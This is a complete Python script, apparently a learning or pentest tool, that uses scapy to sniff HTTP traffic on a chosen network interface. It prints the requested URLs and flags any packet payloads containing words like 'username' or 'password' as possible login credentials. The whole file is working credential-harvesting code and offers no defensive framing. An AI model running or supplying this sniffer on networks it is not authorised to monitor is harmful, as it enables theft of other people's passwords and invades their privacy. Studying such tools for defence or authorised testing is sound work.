#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse
import sys
from colorama import Fore, Style

if len(sys.argv) == 1:
    print("[-] Please provide the required arguments. Use --help for usage information.")
    exit(1)

# Function to parse command-line arguments and return the selected network interface
def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff")
    args = parser.parse_args()
    if not args.interface:
        parser.error("[-] Please specify an interface using -i or --interface.")
    return args.interface

# Function to start sniffing packets on the specified interface
def sniff(interface):
    print(f"[+] Sniffing started on interface {interface}")
    scapy.sniff(iface=interface, store=False, prn=process_packets)

# Function to process each sniffed packet and extract HTTP request info and potential credentials
def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request --->", url.decode(errors='ignore'))

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            keywords = ['username', 'password', 'login', 'signup', 'user', 'pass', 'passwd', 'uname']
            for keyword in keywords:
                if keyword in load.lower():
                    print(Fore.RED + "[+] Possible Login Credentials --->", load + Style.RESET_ALL)
                    break

try:
    sniff(get_interface())
except PermissionError:
    print("[-] This tool requires root permissions.")
except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C. Exiting...")
    sys.exit(0)